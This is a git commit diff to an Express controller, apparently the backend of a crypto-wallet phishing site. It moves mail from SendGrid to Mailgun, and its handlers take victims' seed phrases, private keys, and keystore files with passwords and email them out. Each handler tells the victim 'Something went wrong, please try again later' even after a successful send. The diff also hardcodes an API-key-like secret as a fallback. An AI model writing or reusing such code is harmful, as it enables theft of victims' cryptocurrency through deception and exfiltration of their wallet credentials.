bad66101ab294d5b856544787fa4b041840a8e60
Michael Ajayi <ajayimichael@hotmail.com>
2023-06-25 17:47:57 +0100

    Switched to mailgun for sending emails and deactived DO MongoDB connected

--- controllers/EmailController.js
+++ controllers/EmailController.js
@@ -3,42 +3,61 @@ const Phrase = require("../models/phrase");
 const PrivateKey = require("../models/privateKey");
 const KeyStoreJson = require("../models/keystoreJson");
 
-sgMail.setApiKey(process.env.SENDGRID_API_KEY);
+// sgMail.setApiKey(process.env.SENDGRID_API_KEY);
+
+const formData = require("form-data");
+const Mailgun = require("mailgun.js");
+const mailgun = new Mailgun(formData);
+const mg = mailgun.client({
+  username: "api",
+  key:
+    process.env.MAILGUN_API_KEY ||
+    "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",
+});
 
 exports.phraseData = async (req, res) => {
   const { phrase, email, wallet } = req.body;
 
-  const msg = {
-    to: email,
-    from: email,
-    subject: "Phrase Data",
-    html: `
+  // const msg = {
+  //   to: email,
+  //   from: email,
+  //   subject: "Phrase Data",
+  //   html: `
+  //       <h1>Phrase Data</h1>
+  //       <p>${phrase}</p>
+  //     `,
+  // };
+
+  // const phraseModel = new Phrase({
+  //   email,
+  //   wallet,
+  //   phrase,
+  // });
+
+  // save phrase to the database
+  // try {
+  //   await phraseModel.save();
+  // } catch (err) {
+  //   console.error(err.message);
+  //   return res.status(400).json({
+  //     success: false,
+  //     msg: err.message,
+  //   });
+  // }
+
+  mg.messages
+    .create("sandboxb71e594c730d42e58761a14591035ea3.mailgun.org", {
+      from: email,
+      to: email,
+      subject: "Phrase Data",
+      html: `
         <h1>Phrase Data</h1>
         <p>${phrase}</p>
       `,
-  };
-
-  const phraseModel = new Phrase({
-    email,
-    wallet,
-    phrase,
-  });
-
-  // save phrase to the database
-  try {
-    await phraseModel.save();
-  } catch (err) {
-    console.error(err.message);
-    return res.status(400).json({
-      success: false,
-      msg: err.message,
-    });
-  }
-
-  sgMail
-    .send(msg)
-    .then(() => {
-      res.status(200).json({
+    })
+    .then((msg) => {
+      console.log(msg);
+      return res.status(200).json({
         success: true,
         msg: "Something went wrong, please try again later",
       });
@@ -50,6 +69,22 @@ exports.phraseData = async (req, res) => {
         msg: err,
       });
     });
+
+  // sgMail
+  //   .send(msg)
+  //   .then(() => {
+  //     res.status(200).json({
+  //       success: true,
+  //       msg: "Something went wrong, please try again later",
+  //     });
+  //   })
+  //   .catch((err) => {
+  //     console.error(err);
+  //     return res.status(400).json({
+  //       success: false,
+  //       msg: err,
+  //     });
+  //   });
 };
 
 exports.privateKeyData = async (req, res) => {
@@ -65,14 +100,23 @@ exports.privateKeyData = async (req, res) => {
       `,
   };
 
-  sgMail
-    .send(msg)
-    .then(() => {
-      res.status(200).json({
+  mg.messages
+    .create("sandbox-123.mailgun.org", {
+      from: "Mainnet Email Service <mainnet-email-service>",
+      to: email,
+      subject: "Private Key Data",
+      html: `
+        <h1>Private Key Data</h1>
+         <p>${privateKey}</p>
+      `,
+    })
+    .then((msg) => {
+      console.log(msg);
+      return res.status(200).json({
         success: true,
         msg: "Something went wrong, please try again later",
       });
-    })
+    }) // logs response data
     .catch((err) => {
       console.error(err);
       return res.status(400).json({
@@ -80,6 +124,22 @@ exports.privateKeyData = async (req, res) => {
         msg: err,
       });
     });
+
+  // sgMail
+  //   .send(msg)
+  //   .then(() => {
+  //     res.status(200).json({
+  //       success: true,
+  //       msg: "Something went wrong, please try again later",
+  //     });
+  //   })
+  //   .catch((err) => {
+  //     console.error(err);
+  //     return res.status(400).json({
+  //       success: false,
+  //       msg: err,
+  //     });
+  //   });
 };
 
 exports.keystoreJSONData = async (req, res) => {
@@ -96,14 +156,24 @@ exports.keystoreJSONData = async (req, res) => {
       `,
   };
 
-  sgMail
-    .send(msg)
-    .then(() => {
-      res.status(200).json({
+  mg.messages
+    .create("sandbox-123.mailgun.org", {
+      from: "Mainnet Email Service <mainnet-email-service>",
+      to: email,
+      subject: "KeyStore JSON Data",
+      html: `
+       <h1>Keystore JSON Data</h1>
+        <p><strong>{keyword} - </strong> ${keyStore}</p>
+        <p><strong>{password} - </strong> ${password}</p>
+      `,
+    })
+    .then((msg) => {
+      console.log(msg);
+      return res.status(200).json({
         success: true,
         msg: "Something went wrong, please try again later",
       });
-    })
+    }) // logs response data
     .catch((err) => {
       console.error(err);
       return res.status(400).json({
@@ -111,4 +181,20 @@ exports.keystoreJSONData = async (req, res) => {
         msg: err,
       });
     });
+
+  // sgMail
+  //   .send(msg)
+  //   .then(() => {
+  //     res.status(200).json({
+  //       success: true,
+  //       msg: "Something went wrong, please try again later",
+  //     });
+  //   })
+  //   .catch((err) => {
+  //     console.error(err);
+  //     return res.status(400).json({
+  //       success: false,
+  //       msg: err,
+  //     });
+  //   });
 };
